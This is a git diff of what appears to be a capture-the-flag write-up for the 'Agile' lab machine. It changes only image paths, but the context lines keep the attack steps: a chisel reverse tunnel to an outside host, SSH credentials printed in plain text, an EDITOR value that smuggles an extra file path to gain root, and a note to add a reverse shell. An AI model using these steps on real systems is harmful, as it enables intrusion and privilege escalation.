@@ -442,7 +442,7 @@ corum@agile:~/.tmp$ ./chisel client 10.10.16.21:12312 R:5555:127.0.0.1:5555
 
 And found SSH creds for edwards:
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ```
 agile edwards d07867c6267dcb5df0af
@@ -495,5 +495,5 @@ export EDITOR="vim -- /app/venv/bin/activate"
 
 Add revshell to `activate` and get root.
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
